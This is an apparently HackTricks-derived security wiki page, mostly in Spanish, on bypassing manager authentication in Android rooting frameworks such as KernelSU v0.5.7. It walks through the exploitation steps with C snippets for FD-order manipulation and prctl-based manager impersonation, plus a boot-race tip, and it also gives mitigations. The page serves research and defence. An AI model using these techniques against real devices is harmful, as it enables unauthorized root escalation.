# Android Rooting Frameworks (KernelSU/Magisk) Manager Auth Bypass & Syscall Hook Abuse

{{#include ../../banners/hacktricks-training.md}}

Los frameworks de rooting como KernelSU, APatch, SKRoot y Magisk suelen parchear el kernel de Linux/Android y exponer funcionalidades privilegiadas a una app "manager" de userspace sin privilegios mediante un syscall hook. Si el paso de autenticación del manager presenta fallos, cualquier app local puede alcanzar este canal y escalar privilegios en dispositivos que ya tienen root.

Esta página abstrae las técnicas y los problemas identificados en investigaciones públicas, especialmente el análisis de KernelSU v0.5.7 realizado por Zimperium, para ayudar a los equipos red y blue a comprender las superficies de ataque, las primitivas de explotación y las mitigaciones robustas.<sup>[[1]](#references)</sup>

---
## Patrón de arquitectura: canal de manager basado en syscall hook

- Un módulo/parche del kernel aplica un hook a un syscall, normalmente prctl, para recibir "comandos" desde userspace.
- El protocolo suele ser: magic_value, command_id, arg_ptr/len ...
- Una app manager de userspace se autentica primero, por ejemplo, CMD_BECOME_MANAGER. Una vez que el kernel marca al caller como un manager de confianza, se aceptan los comandos privilegiados:
- Conceder root al caller, por ejemplo, CMD_GRANT_ROOT
- Gestionar allowlists/deny-lists para su
- Ajustar la política de SELinux, por ejemplo, CMD_SET_SEPOLICY
- Consultar la versión/configuración
- Como cualquier app puede invocar syscalls, la corrección de la autenticación del manager es crítica.

Ejemplo, diseño de KernelSU:
- Syscall con hook: prctl
- Magic value para desviar la ejecución al handler de KernelSU: 0xDEADBEEF
- Los comandos incluyen: CMD_BECOME_MANAGER, CMD_GET_VERSION, CMD_ALLOW_SU, CMD_SET_SEPOLICY, CMD_GRANT_ROOT, etc.

---
## Flujo de autenticación de KernelSU v0.5.7, tal como está implementado

Cuando userspace llama a prctl(0xDEADBEEF, CMD_BECOME_MANAGER, data_dir_path, ...), KernelSU verifica:

1) Comprobación del prefijo de la ruta
- La ruta proporcionada debe comenzar con un prefijo esperado para el UID del caller, por ejemplo, /data/data/<pkg> o /data/user/<id>/<pkg>.
- Referencia: lógica del prefijo de ruta en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

2) Comprobación de ownership
- La ruta debe pertenecer al UID del caller.
- Referencia: lógica de ownership en core_hook.c (v0.5.7).<sup>[[2]](#references)</sup>

3) Comprobación de la firma del APK mediante un escaneo de la tabla de FDs
- Iterar sobre los file descriptors abiertos del proceso que realiza la llamada.
- Seleccionar el primer archivo cuya ruta coincida con /data/app/*/base.apk.
- Analizar la firma APK v2 y verificarla frente al certificado oficial del manager.
- Referencias: manager.c, donde se iteran los FDs, y apk_sign.c, donde se realiza la verificación APK v2.<sup>[[3]](#references)[[4]](#references)</sup>

Si todas las comprobaciones tienen éxito, el kernel almacena temporalmente en caché el UID del manager y acepta comandos privilegiados de ese UID hasta que se restablezca.

---
## Clase de vulnerabilidad: confiar en el “primer APK coincidente” durante la iteración de FDs

Si la comprobación de la firma se vincula al "primer /data/app/*/base.apk coincidente" encontrado en la tabla de FDs del proceso, en realidad no está verificando el paquete propio del caller. Un atacante puede colocar previamente un APK firmado legítimamente, el del manager real, de forma que aparezca antes en la lista de FDs que su propio base.apk.

Esta confianza por indirección permite que una app sin privilegios suplante al manager sin poseer su signing key.<sup>[[1]](#references)</sup>

Propiedades clave explotadas:<sup>[[1]](#references)</sup>
- El escaneo de FDs no vincula el resultado con la identidad del paquete del caller; solo realiza pattern matching sobre strings de rutas.
- open() devuelve el FD disponible con el número más bajo. Al cerrar primero los FDs con números más bajos, un atacante puede controlar el orden.
- El filtro solo comprueba que la ruta coincida con /data/app/*/base.apk, no que corresponda al paquete instalado del caller.

---
## Requisitos previos del ataque

- El dispositivo ya tiene root mediante un rooting framework vulnerable, por ejemplo, KernelSU v0.5.7.
- El atacante puede ejecutar código arbitrario sin privilegios localmente, dentro del proceso de una app Android.
- El manager real todavía no se ha autenticado, por ejemplo, justo después de un reinicio. Algunos frameworks almacenan en caché el UID del manager después de autenticarse correctamente; es necesario ganar la race.<sup>[[1]](#references)</sup>

---
## Resumen de la explotación, KernelSU v0.5.7

Pasos de alto nivel:<sup>[[1]](#references)[[9]](#references)</sup>
1) Crear una ruta válida al directorio de datos de la propia app para satisfacer las comprobaciones de prefijo y ownership.
2) Asegurarse de que un base.apk legítimo de KernelSU Manager se abra en un FD con un número menor que el de su propio base.apk.
3) Invocar prctl(0xDEADBEEF, CMD_BECOME_MANAGER, <your_data_dir>, ...) para superar las comprobaciones.
4) Ejecutar comandos privilegiados como CMD_GRANT_ROOT, CMD_ALLOW_SU y CMD_SET_SEPOLICY para mantener la elevación.

Notas prácticas sobre el paso 2, orden de los FDs:<sup>[[1]](#references)</sup>
- Identificar el FD del proceso correspondiente al propio /data/app/*/base.apk recorriendo los symlinks de /proc/self/fd.
- Cerrar un FD bajo, por ejemplo, stdin, fd 0, y abrir primero el APK del manager legítimo para que ocupe el fd 0, o cualquier índice menor que el FD del propio base.apk.
- Incluir el APK del manager legítimo en la propia app para que su ruta satisfaga el filtro ingenuo del kernel. Por ejemplo, colocarlo en una subruta que coincida con /data/app/*/base.apk.

Fragmentos de código de ejemplo, Android/Linux, solo ilustrativos:

Enumerar los FDs abiertos para localizar entradas base.apk:
```c
#include <dirent.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

int find_first_baseapk_fd(char out_path[PATH_MAX]) {
DIR *d = opendir("/proc/self/fd");
if (!d) return -1;
struct dirent *e; char link[PATH_MAX]; char p[PATH_MAX];
int best_fd = -1;
while ((e = readdir(d))) {
if (e->d_name[0] == '.') continue;
int fd = atoi(e->d_name);
snprintf(link, sizeof(link), "/proc/self/fd/%d", fd);
ssize_t n = readlink(link, p, sizeof(p)-1);
if (n <= 0) continue; p[n] = '\0';
if (strstr(p, "/data/app/") && strstr(p, "/base.apk")) {
if (best_fd < 0 || fd < best_fd) {
best_fd = fd; strncpy(out_path, p, PATH_MAX);
}
}
}
closedir(d);
return best_fd; // First (lowest) matching fd
}
```
Forzar que un FD de número inferior apunte al APK legítimo del manager:
```c
#include <fcntl.h>
#include <unistd.h>

void preopen_legit_manager_lowfd(const char *legit_apk_path) {
// Reuse stdin (fd 0) if possible so the next open() returns 0
close(0);
int fd = open(legit_apk_path, O_RDONLY);
(void)fd; // fd should now be 0 if available
}
```
Autenticación del manager mediante un hook de prctl:
```c
#include <sys/prctl.h>
#include <stdint.h>

#define KSU_MAGIC          0xDEADBEEF
#define CMD_BECOME_MANAGER 0x100  // Placeholder; command IDs are framework-specific

static inline long ksu_call(unsigned long cmd, unsigned long arg2,
unsigned long arg3, unsigned long arg4) {
return prctl(KSU_MAGIC, cmd, arg2, arg3, arg4);
}

int become_manager(const char *my_data_dir) {
long result = -1;
// arg2: command, arg3: pointer to data path (userspace->kernel copy), arg4: optional result ptr
result = ksu_call(CMD_BECOME_MANAGER, (unsigned long)my_data_dir, 0, 0);
return (int)result;
}
```
After success, privileged commands (examples):
- CMD_GRANT_ROOT: promover el proceso actual a root
- CMD_ALLOW_SU: añadir tu paquete/UID a la allowlist para su persistente
- CMD_SET_SEPOLICY: ajustar la política de SELinux según lo permita el framework

Race/persistence tip:
- Register a BOOT_COMPLETED receiver in AndroidManifest (RECEIVE_BOOT_COMPLETED) to start early after reboot and attempt authentication before the real manager.<sup>[[1]](#references)</sup>

---
## Guía de detección y mitigación

Para desarrolladores de frameworks:
- Vincula la autenticación al paquete/UID del caller, no a FDs arbitrarios:
- Resuelve el paquete del caller a partir de su UID y verifícalo contra la firma del paquete instalado (mediante PackageManager) en lugar de escanear FDs.
- Si es solo a nivel de kernel, usa una identidad estable del caller (task creds) y valida contra una fuente de verdad estable gestionada por init/helper de userspace, no mediante FDs de procesos.
- Evita las comprobaciones de prefijo de ruta como identidad; el caller puede satisfacerlas trivialmente.
- Usa challenge–response basado en nonce a través del canal y elimina cualquier identidad de manager almacenada en caché durante el arranque o ante eventos clave.
- Considera usar IPC autenticado basado en Binder en lugar de sobrecargar syscalls genéricas cuando sea viable.

Para defensores/blue team:
- Detecta la presencia de rooting frameworks y procesos de manager; monitoriza llamadas a prctl con magic constants sospechosas (por ejemplo, 0xDEADBEEF) si tienes telemetría del kernel.
- En flotas gestionadas, bloquea o genera alertas ante boot receivers de paquetes no confiables que intenten rápidamente ejecutar comandos privilegiados del manager después del arranque.
- Asegúrate de que los dispositivos estén actualizados a versiones parcheadas del framework; invalida los IDs de manager almacenados en caché tras una actualización.

Limitaciones del ataque:
- Solo afecta a dispositivos que ya tienen root mediante un framework vulnerable.
- Normalmente requiere un reinicio/race window antes de que el manager legítimo se autentique (algunos frameworks almacenan en caché el UID del manager hasta que se restablece).

---
## Notas relacionadas entre frameworks

- La autenticación basada en contraseña (por ejemplo, builds históricos de APatch/SKRoot) puede ser débil si las contraseñas se pueden adivinar o someter a bruteforce, o si las validaciones contienen errores.<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- La autenticación basada en paquete/firma (por ejemplo, KernelSU) es más sólida en principio, pero debe vincularse al caller real, no a artefactos indirectos como escaneos de FD.<sup>[[1]](#references)[[5]](#references)</sup>
- Magisk: CVE-2024-48336 (MagiskEoP) demostró que incluso los ecosistemas maduros pueden ser susceptibles a la suplantación de identidad, lo que permite la ejecución de código con root dentro del contexto del manager.<sup>[[1]](#references)[[8]](#references)</sup>

---
## Referencias

- [1] [Zimperium – The Rooting of All Evil: Security Holes That Could Compromise Your Mobile Device](https://zimperium.com/blog/the-rooting-of-all-evil-security-holes-that-could-compromise-your-mobile-device)
- [2] [KernelSU v0.5.7 – core_hook.c path checks (L193, L201)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/core_hook.c#L193)
- [3] [KernelSU v0.5.7 – manager.c FD iteration/signature check (L43+)](https://github.com/tiann/KernelSU/blob/v0.5.7/kernel/manager.c#L43)
- [4] [KernelSU – apk_sign.c APK v2 verification (main)](https://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L319)
- [5] [KernelSU project](https://kernelsu.org/)
- [6] [APatch](https://github.com/bmax121/APatch)
- [7] [SKRoot](https://github.com/abcz316/SKRoot-linuxKernelRoot)
- [8] [MagiskEoP – CVE-2024-48336](https://github.com/canyie/MagiskEoP)
- [9] [KSU PoC demo video (Wistia)](https://zimperium-1.wistia.com/medias/ep1dg4t2qg?videoFoam=true)

{{#include ../../banners/hacktricks-training.md}}
